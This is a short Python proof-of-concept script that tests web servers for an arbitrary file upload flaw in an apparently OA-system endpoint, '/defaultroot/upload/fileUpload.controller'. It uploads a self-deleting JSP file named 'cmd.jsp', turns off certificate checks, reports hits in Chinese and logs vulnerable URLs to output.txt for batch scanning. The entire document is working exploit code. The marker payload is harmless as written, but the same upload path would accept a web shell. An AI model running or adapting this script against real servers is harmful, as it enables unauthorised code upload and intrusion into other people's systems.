import requests
import re
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings()
from colorama import init,Fore
init(autoreset=True)


def poc(url):
    try:
        target = urljoin(url,"/defaultroot/upload/fileUpload.controller")
        header = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "Keep-Alive", "Content-Type": "multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0"}
        burp0_data = "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name=\"file\"; filename=\"cmd.jsp\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n<% out.println(\"10\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--"
        res = requests.post(url=target,headers=header,verify=False,timeout=5,data=burp0_data)
        if res.status_code == 200 and "fileSize" in res.text:
            print(Fore.GREEN + url +'[+]存在controller 任意文件上传漏洞')
            pattern = re.compile(r'"data":"(.*)"}')
            filename=pattern.findall(res.text)[0]
            print("上传成功验证地址为: "+ url + "/defaultroot/upload/html/" + filename)
            with open(r'output.txt', 'a+') as w:
                w.write(url+"存在controller 任意文件上传漏洞，访问后会自动删除,上传成功路径为:"+ '\n' + url + "/defaultroot/upload/html/" + filename + '\n')
            print("[" + "-" * 80 + "]")
        else:
            print(Fore.RED + url +'[-]不存在漏洞')
            print("[" + "-" * 80 + "]")
    except Exception as err:
        print(err)